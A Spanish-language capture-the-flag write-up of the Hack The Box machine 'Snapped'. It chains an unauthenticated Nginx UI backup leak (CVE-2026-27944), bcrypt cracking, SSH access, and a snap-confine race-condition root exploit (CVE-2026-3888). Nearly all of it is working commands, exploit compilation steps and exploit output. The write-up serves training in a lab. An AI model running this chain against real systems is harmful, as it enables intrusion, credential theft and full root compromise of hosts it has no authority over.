# HTB — Snapped 🟥 Hard
 
> **Plataforma:** Hack The Box  
> **SO:** Linux (Ubuntu 24.04 LTS)  
> **Dificultad:** Hard  
> **CVEs:** CVE-2026-27944 · CVE-2026-3888  
> **Autor del writeup:** *CipherWall-Mz*
 
---
 
## Índice
 
1. [Reconocimiento](#1-reconocimiento)
2. [Enumeración Web](#2-enumeración-web)
3. [CVE-2026-27944 — Backup sin autenticación](#3-cve-2026-27944--backup-sin-autenticación)
4. [Cracking de hashes bcrypt](#4-cracking-de-hashes-bcrypt)
5. [Acceso inicial — SSH](#5-acceso-inicial--ssh)
6. [Escalada de privilegios — CVE-2026-3888](#6-escalada-de-privilegios--cve-2026-3888)
7. [Root](#7-root)
---
 
## 1. Reconocimiento
 
### Escaneo de puertos
 
```bash
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.x.x -oG allPorts
```
 
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
 
Solo dos puertos abiertos: **SSH (22)** y **HTTP (80)**.
 
### Escaneo de versiones y scripts
 
```bash
nmap -sCV -p22,80 10.129.x.x -oN targeted
```
 
```
22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp open  http  nginx 1.24.0 (Ubuntu)
              └─ Redirect → http://snapped.htb/
```
 
Añadimos el dominio al `/etc/hosts`:
 
```bash
echo "10.129.x.x snapped.htb" >> /etc/hosts
```
 
---
 
## 2. Enumeración Web
 
### Fuzzing de subdominios (Virtual Host)
 
```bash
ffuf -u http://10.129.x.x \
     -H 'Host: FUZZ.snapped.htb' \
     -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -ac
```
 
```
admin   [Status: 200, Size: 1407]
```
 
Añadimos `admin.snapped.htb` al `/etc/hosts` y visitamos el panel.
 
### Identificación de versión
 
```bash
# Extraemos el JS principal
curl http://admin.snapped.htb/ -s | grep -P '.js\b'
# → ./assets/index-DoHxQupa.js
 
# Buscamos el archivo de versión
curl http://admin.snapped.htb/assets/index-DoHxQupa.js -s | grep -oP 'version[-\w]*\.js'
# → version-BWPlJ0ga.js
 
curl http://admin.snapped.htb/assets/version-BWPlJ0ga.js
# → const t="2.3.2"
```
 
> **Hallazgo:** Panel **Nginx UI v2.3.2** en `admin.snapped.htb`
 
### Fuzzing de endpoints API
 
```bash
feroxbuster -u http://admin.snapped.htb/api
```
 
| Endpoint | Estado | Nota |
|---|---|---|
| `/api/install` | 200 | `{"lock":true,"timeout":false}` — ya instalado |
| `/api/backup` | **200** | **¡Devuelve ZIP sin autenticación!** |
| `/api/licenses` | 200 | JSON de licencias de dependencias |
| `/api/user`, `/api/users`, etc. | 403 | Requieren autenticación |
 
> ⚠️ **Hallazgo crítico:** `/api/backup` es accesible sin auth y devuelve un archivo binario cifrado.
 
---
 
## 3. CVE-2026-27944 — Backup sin autenticación
 
### Descarga del backup
 
```bash
curl http://admin.snapped.htb/api/backup -v -o backup.bin 2>&1 | grep X-Backup-Security
```
 
```
X-Backup-Security: US8nZUXhWdKZ7J1mbE1TProx9oT5H9HzSmaqng5wD0c=:E9sRPUh0wUOolJp7ijmLSg==
```
 
La cabecera expone la clave AES-256 y el IV en Base64 separados por `:`:
 
- **Parte 1** (32 bytes) → Clave AES-256  
- **Parte 2** (16 bytes) → IV (Initialization Vector)
### Descifrado con el PoC
 
```bash
python3 poc.py --target http://admin.snapped.htb/ --decrypt
```
 
```
[*] Main archive contains: ['hash_info.txt', 'nginx-ui.zip', 'nginx.zip']
[*] Decrypting nginx-ui.zip...  → Extracted 2 files to backup_extracted/nginx-ui
[*] Decrypting nginx.zip...     → Extracted 22 files to backup_extracted/nginx
 
nginx-ui_hash : 239501dc783b4a8f13ed06ceba1799a5a7506573e6a94f2946dcb0e76c931f84
version       : 2.3.2
```
 
### Extracción de hashes de la base de datos
 
```bash
cd backup_extracted/nginx-ui
sqlite3 database.db
 
sqlite> .headers on
sqlite> select name, password from users;
```
 
```
admin     │ $2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm
jonathan  │ $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
```
 
Ambos son hashes **bcrypt** (`$2a$10$`).
 
---
 
## 4. Cracking de hashes bcrypt
 
```bash
hashcat -m 3200 hashes.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
```
 
```
$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq : linkinpark
```
 
| Usuario | Contraseña | Estado |
|---|---|---|
| `jonathan` | `linkinpark` | ✅ Crackeado |
| `admin` | — | ❌ No crackeado |
 
> **Nota:** El modo 3200 de hashcat corresponde a bcrypt `$2*$` (Blowfish). Es intencionalmente lento; las contraseñas comunes del diccionario se craquean, las complejas probablemente no.
 
---
 
## 5. Acceso inicial — SSH
 
### Validación de credenciales
 
```bash
netexec ssh snapped.htb -u jonathan -p linkinpark
# [+] jonathan:linkinpark  Linux - Shell access!
```
 
### Login
 
```bash
ssh jonathan@snapped.htb
# Password: linkinpark
```
 
```bash
jonathan@snapped:~$ cat user.txt
03c0ba5************************
```
 
---
 
## 6. Escalada de privilegios — CVE-2026-3888
 
### Enumeración inicial
 
```bash
sudo -l
# Sorry, user jonathan may not run sudo on snapped.
 
id
# uid=1000(jonathan) gid=1000(jonathan) groups=1000(jonathan)
 
cat /etc/passwd | grep 'sh$'
# root y jonathan únicamente
```
 
Sin sudo, sin grupos especiales (docker, lxd, disk). Exploramos otras vías.
 
### Versión del kernel y snapd
 
```bash
uname -a
# Linux snapped 6.17.0-19-generic — kernel de Marzo 2026
 
snap version
# snap    2.63.1+24.04
# snapd   2.63.1+24.04
```
 
### Descubrimiento clave: tmpfiles con limpieza agresiva
 
```bash
systemctl list-timers systemd-tmpfiles-clean
# Runs every minute
 
cat /usr/lib/tmpfiles.d/tmp.conf
# D /tmp 1777 root root 4m   ← ¡4 minutos! (el default es 30 días)
```
 
> 🔑 **Observación crítica:** El umbral de limpieza de `/tmp` se redujo de 30 días a **4 minutos**, haciendo CVE-2026-3888 explotable en minutos.
 
### CVE-2026-3888 — snap-confine / systemd-tmpfiles LPE
 
**Descripción:** Escalada de privilegios local en `snapd` (< 2.73) en todas las versiones LTS de Ubuntu. Permite obtener root recreando el directorio privado `/tmp/.snap` de snap cuando `systemd-tmpfiles` lo limpia automáticamente.
 
**Componentes involucrados:**
 
| Componente | Rol |
|---|---|
| `snap-confine` (SUID root) | Configura entornos de ejecución para apps snap |
| `systemd-tmpfiles` | Limpia archivos/dirs temporales según umbral de edad |
 
**Flujo del ataque:**
 
1. `snap-confine` usa `/tmp/.snap/` como área de staging para bind-mounts
2. `systemd-tmpfiles` elimina `/tmp/.snap` cuando supera el umbral (4m aquí)
3. Al desaparecer, `snap-confine` lo recrea desde cero en el siguiente lanzamiento
4. El atacante gana la race condition intercambiando atómicamente (`rename()`) el directorio legítimo por uno envenenado — después de que `snap-confine` pasa su validación pero antes del bind-mount
5. `snap-confine` (corriendo como root) bind-monta los archivos envenenados del atacante
6. La carga útil reemplaza `ld-linux-x86-64.so.2` — cuando el SUID `snap-confine` lo carga, ejecuta el código del atacante como root
### Compilación del exploit
 
```bash
# Clonar el PoC
git clone https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE
cd CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE
 
# Compilar el exploit principal (variante SUID para Ubuntu 24.04)
gcc -O2 -static -o exploit exploit_suid.c
 
# Compilar el shared object malicioso (reemplaza el dynamic linker)
gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c
```
 
### Transferencia al objetivo
 
```bash
sshpass -p linkinpark scp exploit librootshell.so jonathan@snapped.htb:/tmp/
```
 
### Ejecución
 
```bash
jonathan@snapped:/tmp$ chmod +x exploit librootshell.so
jonathan@snapped:/tmp$ ./exploit librootshell.so
```
 
**Flujo del exploit (ejecución exitosa):**
 
```
================================================================
    CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE
================================================================
[*] Payload: /tmp/librootshell.so (9184 bytes)
 
[Phase 1] Entering Firefox sandbox...
[+] Inner shell PID: 5365
 
[Phase 2] Waiting for .snap deletion...
[+] .snap deleted.
 
[Phase 3] Destroying cached mount namespace...
[+] Namespace destroyed.
 
[Phase 4] Setting up and running the race...
[*]   285 entries copied to exchange directory
[*]   Starting race...
[!]   TRIGGER — swapping directories...
[+]   SWAP DONE — race won!
 
[Phase 5] Injecting payload into poisoned namespace...
[+]   ld-linux owned by uid 1000 (attacker). Race confirmed.
[*]   Overwriting ld-linux-x86-64.so.2...
[+]   Payload injected.
 
[Phase 6] Triggering root via SUID snap-confine...
[*]   Exit status: 0
 
[Phase 7] Verifying...
[+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)
 
================================================================
  ROOT SHELL: /var/snap/firefox/common/bash -p
================================================================
```
 
> **Nota:** Si el exploit falla con `permission denied` en Phase 4, puede ser AppArmor interfiriendo. En ese caso usa la flag `-s` para saltar la espera de Phase 2 y reintentar: `./exploit librootshell.so -s`
 
---
 
## 7. Root
 
```bash
bash-5.1# whoami
root
 
bash-5.1# cat /root/root.txt
<flag>
```
 
---
 
## Resumen de la cadena de ataque
 
```
Reconocimiento
      │
      ▼
admin.snapped.htb  (Nginx UI 2.3.2)
      │
      ▼
CVE-2026-27944: /api/backup sin auth
→ AES key+IV en cabecera X-Backup-Security
→ Descifrado del backup → database.db
→ Hash bcrypt de jonathan
      │
      ▼
hashcat -m 3200 → jonathan:linkinpark
      │
      ▼
SSH como jonathan → user.txt
      │
      ▼
snapd 2.63.1 + tmpfiles 4m = CVE-2026-3888
→ Race condition en snap-confine (SUID)
→ Poison del dynamic linker ld-linux-x86-64.so.2
      │
      ▼
root shell → root.txt
```
 
---
 
## Herramientas utilizadas
 
| Herramienta | Propósito |
|---|---|
| `nmap` | Reconocimiento de puertos y servicios |
| `ffuf` | Fuzzing de subdominios |
| `feroxbuster` | Fuzzing de directorios y endpoints API |
| `curl` | Interacción manual con la API |
| `sqlite3` | Inspección de la base de datos del backup |
| `hashcat` (modo 3200) | Cracking de hashes bcrypt |
| `netexec` | Validación de credenciales SSH |
| `gcc` | Compilación del exploit CVE-2026-3888 |
 
---
 
*WriteUp por [CipherWall-Mz] — Hack The Box*
